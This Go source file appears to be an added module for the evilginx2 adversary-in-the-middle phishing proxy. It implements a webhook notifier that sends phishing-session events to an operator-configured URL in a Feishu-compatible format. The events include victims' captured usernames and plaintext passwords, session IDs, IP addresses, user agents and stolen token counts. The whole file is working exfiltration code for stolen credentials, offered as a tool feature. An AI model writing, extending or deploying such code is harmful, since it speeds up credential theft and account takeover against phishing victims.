package core

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// NotificationEvent types
const (
	EventSessionCreated     = "session_created"
	EventCredentialCaptured = "credential_captured"
	EventTokensCaptured     = "tokens_captured"
	EventSessionComplete    = "session_complete"
)

// WebhookNotifier handles sending webhook notifications
type WebhookNotifier struct {
	url        string
	secret     string
	enabled    bool
	events     map[string]bool
	httpClient *http.Client
}

// WebhookPayload represents the webhook request body
type WebhookPayload struct {
	Event     string                 `json:"event"`
	Timestamp string                 `json:"timestamp"`
	Phishlet  string                 `json:"phishlet"`
	SessionID string                 `json:"session_id"`
	Data      map[string]interface{} `json:"data"`
}

// NewWebhookNotifier creates a new WebhookNotifier
func NewWebhookNotifier() *WebhookNotifier {
	return &WebhookNotifier{
		enabled: false,
		events: map[string]bool{
			EventSessionCreated:     true,
			EventCredentialCaptured: true,
			EventTokensCaptured:     true,
			EventSessionComplete:    true,
		},
		httpClient: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

// SetURL sets the webhook URL
func (w *WebhookNotifier) SetURL(url string) {
	w.url = url
	if url != "" {
		w.enabled = true
	} else {
		w.enabled = false
	}
}

// GetURL returns the webhook URL
func (w *WebhookNotifier) GetURL() string {
	return w.url
}

// SetSecret sets the HMAC signing secret
func (w *WebhookNotifier) SetSecret(secret string) {
	w.secret = secret
}

// GetSecret returns the secret (masked)
func (w *WebhookNotifier) GetSecret() string {
	if w.secret == "" {
		return ""
	}
	return "********"
}

// IsEnabled returns whether webhooks are enabled
func (w *WebhookNotifier) IsEnabled() bool {
	return w.enabled && w.url != ""
}

// Enable enables webhook notifications
func (w *WebhookNotifier) Enable() {
	if w.url != "" {
		w.enabled = true
	}
}

// Disable disables webhook notifications
func (w *WebhookNotifier) Disable() {
	w.enabled = false
}

// SetEvents sets which events to notify on
func (w *WebhookNotifier) SetEvents(events []string) {
	w.events = make(map[string]bool)
	for _, e := range events {
		w.events[e] = true
	}
}

// NotifySessionCreated sends notification when a new session is created
func (w *WebhookNotifier) NotifySessionCreated(phishlet, sessionID, remoteAddr, userAgent string) {
	if !w.shouldNotify(EventSessionCreated) {
		return
	}

	payload := WebhookPayload{
		Event:     EventSessionCreated,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Phishlet:  phishlet,
		SessionID: sessionID,
		Data: map[string]interface{}{
			"remote_addr": remoteAddr,
			"user_agent":  userAgent,
		},
	}

	go w.send(payload)
}

// NotifyCredentialCaptured sends notification when credentials are captured
func (w *WebhookNotifier) NotifyCredentialCaptured(phishlet, sessionID, username, password string) {
	if !w.shouldNotify(EventCredentialCaptured) {
		return
	}

	payload := WebhookPayload{
		Event:     EventCredentialCaptured,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Phishlet:  phishlet,
		SessionID: sessionID,
		Data: map[string]interface{}{
			"username": username,
			"password": password,
		},
	}

	go w.send(payload)
}

// NotifyTokensCaptured sends notification when auth tokens are captured
func (w *WebhookNotifier) NotifyTokensCaptured(phishlet, sessionID string, tokenCount int) {
	if !w.shouldNotify(EventTokensCaptured) {
		return
	}

	payload := WebhookPayload{
		Event:     EventTokensCaptured,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Phishlet:  phishlet,
		SessionID: sessionID,
		Data: map[string]interface{}{
			"token_count": tokenCount,
		},
	}

	go w.send(payload)
}

// NotifySessionComplete sends notification when session capture is complete
func (w *WebhookNotifier) NotifySessionComplete(phishlet, sessionID, username string, hasTokens bool) {
	if !w.shouldNotify(EventSessionComplete) {
		return
	}

	payload := WebhookPayload{
		Event:     EventSessionComplete,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Phishlet:  phishlet,
		SessionID: sessionID,
		Data: map[string]interface{}{
			"username":   username,
			"has_tokens": hasTokens,
		},
	}

	go w.send(payload)
}

// shouldNotify checks if notification should be sent for this event
func (w *WebhookNotifier) shouldNotify(event string) bool {
	if !w.enabled || w.url == "" {
		return false
	}
	return w.events[event]
}

// send sends the webhook request
func (w *WebhookNotifier) send(payload WebhookPayload) {
	// First marshal the payload to get the text content
	payloadJson, err := json.Marshal(payload)
	if err != nil {
		log.Debug("webhook: failed to marshal payload: %v", err)
		return
	}

	// Wrap in Feishu-compatible format
	feishuPayload := map[string]interface{}{
		"msg_type": "text",
		"content": map[string]string{
			"text": string(payloadJson),
		},
	}

	jsonData, err := json.Marshal(feishuPayload)
	if err != nil {
		log.Debug("webhook: failed to marshal feishu payload: %v", err)
		return
	}

	req, err := http.NewRequest("POST", w.url, bytes.NewBuffer(jsonData))
	if err != nil {
		log.Debug("webhook: failed to create request: %v", err)
		return
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Evilginx-Webhook/1.0")
	req.Header.Set("X-Evilginx-Event", payload.Event)

	// Add HMAC signature if secret is set
	if w.secret != "" {
		signature := w.sign(jsonData)
		req.Header.Set("X-Evilginx-Signature", fmt.Sprintf("sha256=%s", signature))
	}

	resp, err := w.httpClient.Do(req)
	if err != nil {
		log.Debug("webhook: request failed: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		log.Debug("webhook: notification sent successfully (event: %s)", payload.Event)
	} else {
		log.Debug("webhook: server returned status %d", resp.StatusCode)
	}
}

// sign creates HMAC-SHA256 signature
func (w *WebhookNotifier) sign(data []byte) string {
	mac := hmac.New(sha256.New, []byte(w.secret))
	mac.Write(data)
	return hex.EncodeToString(mac.Sum(nil))
}

// Test sends a test webhook to verify configuration
func (w *WebhookNotifier) Test() error {
	if w.url == "" {
		return fmt.Errorf("webhook URL not configured")
	}

	payload := WebhookPayload{
		Event:     "test",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Phishlet:  "test",
		SessionID: "test-session-id",
		Data: map[string]interface{}{
			"message": "This is a test webhook notification from Evilginx",
		},
	}

	// First marshal the payload to get the text content
	payloadJson, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal payload: %v", err)
	}

	// Wrap in Feishu-compatible format
	feishuPayload := map[string]interface{}{
		"msg_type": "text",
		"content": map[string]string{
			"text": string(payloadJson),
		},
	}

	jsonData, err := json.Marshal(feishuPayload)
	if err != nil {
		return fmt.Errorf("failed to marshal feishu payload: %v", err)
	}

	req, err := http.NewRequest("POST", w.url, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Evilginx-Webhook/1.0")
	req.Header.Set("X-Evilginx-Event", "test")

	if w.secret != "" {
		signature := w.sign(jsonData)
		req.Header.Set("X-Evilginx-Signature", fmt.Sprintf("sha256=%s", signature))
	}

	resp, err := w.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		return nil
	}
	return fmt.Errorf("server returned status %d", resp.StatusCode)
}
